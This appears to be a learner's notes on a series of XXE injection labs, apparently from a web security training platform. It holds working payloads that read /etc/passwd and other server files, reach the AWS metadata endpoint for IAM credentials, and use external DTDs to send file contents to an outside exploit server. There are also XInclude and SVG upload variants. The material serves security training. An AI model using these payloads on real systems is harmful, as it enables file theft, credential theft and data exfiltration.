# XML external entities (XXE) injection

# Exploiting XXE using external entities to retrieve files. 
Get /etc/passwd
## Observations
- The stock check function uses XML. 
- Basic payload results in "entities are not allowed for security reasons".
- Had to append the xxe entity to the product number:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>1&xxe;</productId><storeId>1</storeId></stockCheck>
```

# XXE to perform SSRF
get the IAM secret for AWS. 
## Observations
- Stock check function uses XML. 
- Modified payload to request burp collab:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://v2ywufdo4vkc5oqsjujksv61csij6nuc.oastify.com" >]>
<stockCheck><productId>2&xxe;</productId><storeId>1</storeId></stockCheck>
```
- Simply change that to the AWS internal URL:
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
```

# Blind XXE with OOB
Get a Burp Collab callback. 
## Observations
- Pretty much what I did in the first part of the attack above. 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://v2ywufdo4vkc5oqsjujksv61csij6nuc.oastify.com" >]>
<stockCheck><productId>2&xxe;</productId><storeId>1</storeId></stockCheck>
```

# Blind XXE with OOB using Parameter Entities
Get external interaction
## Observations
- So this one won't allow me to use the previous payload because it doesn't allow entities. To bypass this we can attempt parameter entities which means we change the structure of the payload to execute outside of the regular XML context. In between the header and query where the payload goes, we add % before the entity name to declare it as an entity then call it before we close it out.
The payload goes from this:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY xxe SYSTEM "http://v2ywufdo4vkc5oqsjujksv61csij6nuc.oastify.com"> ]>
<stockCheck><productId>2&xxe;</productId>...
```
To this:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://v2ywufdo4vkc5oqsjujksv61csij6nuc.oastify.com"> %xxe; ]>
<stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
```

# Blind XXE to exfiltrate data using a malicious external DTD
Get /etc/hosts
DTDs will allow us to stack entities when we need to do multiple commands/functions.
## Observations
- Similar stock check function but we can't retrieve files directly and OOB works. So we'll need to host a DTD to see if external DTD are allowed. 
- DTD to retrieve /etc/hosts:
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0a2300d703f5a1ed82b0737001c500d9.exploit-server.net//?x=%file;'>">
%eval;
%exfil;
```
Payload:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY % file SYSTEM "file:///etc/hosts">
  <!ENTITY % dtd SYSTEM "http://v2ywufdo4vkc5oqsjujksv61csij6nuc.oastify.com/evil.dtd">
  %dtd;
]>
<stockCheck>
  <productId>&exfil;</productId>
  <storeId>1</storeId>
</stockCheck>
```
- It also doesn't allow entities so we'll need to parameterize the payload sent to the server:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a2300d703f5a1ed82b0737001c500d9.exploit-server.net/evil.dtd"> %xxe;%eval;
%exfil;]>
<stockCheck>
  <productId>2</productId>
  <storeId>1</storeId>
</stockCheck>
```
Note that the entities in the DTD are now parameters in the above payload. 

# Exploiting blind XXE to retrieve data via error messages
Get /etc/password via OOB with DTD
## Observations
- There is a submit feedback form with file upload. 
-- http://localhost:46261/feedback/screenshots/1.php is where the one I uploaded landed. Maybe a way to host DTDs that are trusted. 
- Reading multi-line data:
-- Use FTP server or if the error returns multiple lines, append the file we're looking for to an intention error. 
Example: Where this DTD would return multiple lines and cause an error, we can instead modify it to append the data to the error. Actually an in-band issue but with an external OOB DTD. 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ad200850482e0b58031841701250032.exploit-server.net/evil.dtd"> %xxe;%eval;
%exfil;]>
<stockCheck>
  <productId>2</productId>
  <storeId>1</storeId>
</stockCheck>
```
DTD to append the file to the error message:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///doesnltexist%file;'>">
%eval;
%exfil;
```

# Exploiting XInclude to retrieve files
Get /etc/passwd
## Observations 
- Not traditional XML in the payload of the check stock function. 
- Tried to induce an error with a single quote and it just shows invalid productId. 
- Sent to targeted selection scan. 
-- Found the XML injection
Request:
```
productId=3&storeId=1]]>><
```
Response:
```
"XML parser exited with error: org.xml.sax.SAXParseException; lineNumber: 4; columnNumber: 18; The character sequence "]]>" must not appear in content unless used to mark the end of a CDATA section."
```
So, we need to develop a payload for this:
- Testing:
```
productId=3<![CDATA[<test></test>]]>&storeId=1
```
Results in ```Invalid Product ID: 3<test></test>``` so it seems to have parsed the CDATA declaration. 
If the parser is Xinclude-aware then it may read a file on the server and return the data to us. Xinclude is useful because there is no traditional <!DOCTYPE> or general parameters or entities needed. 
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

# Exploiting XXE via image file upload
YAY file uploads, love this. 
Get /etc/hostname. 
## Observations
- No real functions other than a comment function in the blog with a form that takes files. 
- Probably an SVG with XML to retrieve files. May need OOB. 
- First try:
```
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xi="http://www.w3.org/2001/XInclude">
  <!-- Linux -->
  <xi:include href="file:///etc/passwd" parse="text"/>
  <!-- Windows example -->
  <!-- <xi:include href="file:///C:/Windows/win.ini" parse="text"/> -->
</svg>
```
Second:
```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg ...>
  <text>&xxe;</text>
</svg>
```
The first try probably didn't work because Xinclude may not be supported. OOB may have been an option but I couldn't host a DTD. 
You define a general entity xxe in the internal subset that points to a local file.
This works because I reference &xxe; inside a <text> node.
The XML parser expands the entity in-band → it reads /etc/hostname and substitutes its contents right there.
The app (or SVG transcoder) then outputs/renders the parsed SVG, so you see the file contents.